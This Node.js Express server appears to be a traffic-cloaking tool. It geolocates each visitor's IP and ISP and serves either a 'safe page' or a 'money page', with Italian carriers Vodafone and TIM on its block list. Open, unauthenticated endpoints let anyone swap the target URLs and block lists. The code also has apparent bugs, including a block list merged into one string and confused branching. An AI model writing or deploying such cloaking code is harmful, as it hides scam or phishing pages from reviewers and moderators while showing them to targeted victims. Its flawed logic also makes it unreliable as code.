const express = require("express");
const app = express();
const request = require('request');
const publicIp = require('public-ip');
const http = require("http");
const exec = require('child_process').exec
const requestIp = require('request-ip');
var iprec = require('ip');
let ejs = require('ejs');
app.use(express.urlencoded({ extended: false }));
app.set('views', __dirname);
app.set('view engine', 'ejs');
app.use(express.static('dist'))
//
var blocked_isp = ['Vodafone, TIM']
var blocked_geo = ['']


app.use(requestIp.mw())

var surl = 'https://www.google.com'
var murl = 'https://www.wikipedia.com'


app.get("/", (req, res, next) => {
	var ipv4
	publicIp.v4().then(ip => {
	  console.log("IPV4 ", ip);
	  console.log(req.ips)
	  console.log(req.clientIp)
	  if ( typeof ip !== 'undefined' )
			{
				let options = new URL("http://ip-api.com/json/"+req.clientIp+"?fields=status,message,country,countryCode,region,regionName,city,zip,isp,query")

				http.get(options, resq => {
				  let data = ""

				  resq.on("data", d => {
				    data += d
				  })
				  resq.on("end", () => {
				    console.log(JSON.parse(data))
				    if (typeof JSON.parse(data).isp !== 'undefined'){
					    	if(blocked_isp.includes(JSON.parse(data).isp) == false){
									request({uri: surl}, 
								    function(error, response, body) {
									res.status(200).write(body);
									res.end();
								  });
					    	} else{
					    		if(blocked_geo.includes(JSON.parse(data).country) == false){
						    		request({uri: surl}, 
								    function(error, response, body) {
									res.status(200).write(body);
									res.end();
								  });
					    		}else{
					    		console.log(murl)
					    		request({uri: murl}, 
								    function(error, response, body) {
									res.status(200).write(body);
									res.end();
								  });
								
								}
					    	}
					    }else {
					    console.log(murl)
					    		request({uri: murl}, 
								    function(error, response, body) {
									res.status(200).write(body);
									res.end();
								  });
					    }
				  })
				}).on('error', function(e) {  console.log(e) ;});

			}
			else
			{
				res.status(200).render(surl);
				return 	next();
			}
	  
	  
	});
	
	
});

// Mock APIs
app.get("/setup", (req, res) => {
  res.status(200).render('setup', {surl:surl, murl:murl, blocked_isp:blocked_isp,blocked_geo:blocked_geo});
});

app.post("/user", (req, res) => {
	  murl = req.body.moneypage_file;
	  surl = req.body.safepage_url;
  res.send({ status: "Updated correctly. Check safe/money page to validate. " });
});

app.post("/blackl", (req, res) => {
  console.log(req.body)

  blocked_isp = req.body.bisp;
  blocked_geo = req.body.bgeo;



  res.send({ status: "Your domain's blacklist has been updated" });
});
// Listen on port 5000
app.listen(process.env.PORT || 5000, () => {
  console.log(`Server is booming on port 5000
Visit http://localhost:5000`);
});